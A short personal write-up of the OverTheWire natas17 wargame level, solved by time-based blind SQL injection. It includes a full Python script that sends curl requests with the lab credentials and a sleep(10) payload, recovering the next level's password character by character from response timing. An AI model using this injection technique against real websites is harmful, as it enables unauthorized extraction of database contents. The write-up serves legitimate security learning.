This lab is the same as natas15 except you get no output regardless of what
query you write. My first thought was again to try creating a union condition
but this won't work since you get no output. Throwing an error in the query
somehow seemed possible to me but mysql_query() just returns false for sql
errors and we get no output anyway.

After scratching my head for a few minutes I looked it up and came upon this
link:

This blogger has very thorough solutions to other labs also. He solved it using
sleep(5) as his true flag. Meaning if his query hit's the sleep(5) condition he
will know because the http request will take at least 5 seconds. I am going to
try combining this fact with my old code from natas5. It should just take 32 * 5
more seconds than it did before.

Here is my code:

import os
import string
import time

request_count = 0
chars = list(string.ascii_letters + string.digits)
password = ""

for i in range(32):
    for char in chars:
        print(f"{i} {char}")
        guess = (i * "_") + char + ((32 - i - 1) * "_")
        print(f"guess = {guess}")
        command = "curl -u natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw -d '"
        command += f"username=natas18\" AND password LIKE BINARY \"{guess}\" "
        command += "AND sleep(10) AND \"1\" = \"1"
        command += "' http://natas17.natas.labs.overthewire.org/index.php"
        start_time = time.time() # time.time() returns time in seconds
        output = os.popen(command).read()
        end_time = time.time()
        if(end_time - start_time >= 9.99):
            password += char
            break
        if(char == "9"):
            raise Exception(f"Error: could not determine {i}th character")
        request_count += 1

print(f"Executed {request_count} curl commands.")
print(f"Final Password = {password}")

I had to increase the sleep time from 5 to 10 seconds. My very slow wifi network
caused some false positives because the latency was more than 5 seconds so my
program thought this meant that the select query reached the sleep(5) condition
when this wasn't the case. My program took 10 minutes and 19 seconds to execute
820 curl commands.
